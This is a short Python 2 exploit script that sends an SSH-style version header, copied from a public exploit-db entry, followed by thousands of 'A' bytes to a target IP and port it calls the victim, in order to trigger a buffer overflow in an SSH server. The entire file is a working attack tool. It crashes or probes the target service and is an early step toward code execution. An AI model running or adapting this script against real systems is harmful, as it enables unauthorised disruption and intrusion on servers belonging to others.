#!/usr/bin/python


import sys
import argparse
import socket


# user input
program_description = "The program inputs ip and port of the victim pc, and sends around 24kB for BoF vuln"
parser = argparse.ArgumentParser(program_description)
parser.add_argument("target_ip", help="Target IP")
parser.add_argument("target_port", type=int, help="Target Port")
parser.add_argument("bytes_to_send", type=int, help="The bytes of the string that will be sent to victim pc")
args = parser.parse_args()

# global parameters
user_input = (args.target_ip, args.target_port, args.bytes_to_send)


# function definitions
def buffer_gen(bytes_to_send):                   
    # initial hex code, as part of the exploit from https://www.exploit-db.com/exploits/1787/
    # prepending the header
    buf = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
    
    buf = buf + 'A' * bytes_to_send
    buf = buf + '\r\n'
    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))

    # ssh server will send some data as soon as we connect
    print 'Server Says: \n', s.recv(1024)
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
    s = socket_setup(input_tuple[0], input_tuple[1])
    buf = buffer_gen(input_tuple[2])

    print "sending buffer: ", buf
    s.send(buf)

    try:
#        recv = s.recv(1024)
#        print "server says: ", recv
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Exploit"
        s.close()
        sys.exit(0)         # gracefully exits upon ctrl-c

# script execution
if __name__ == "__main__":
    main(user_input)        # calling main function

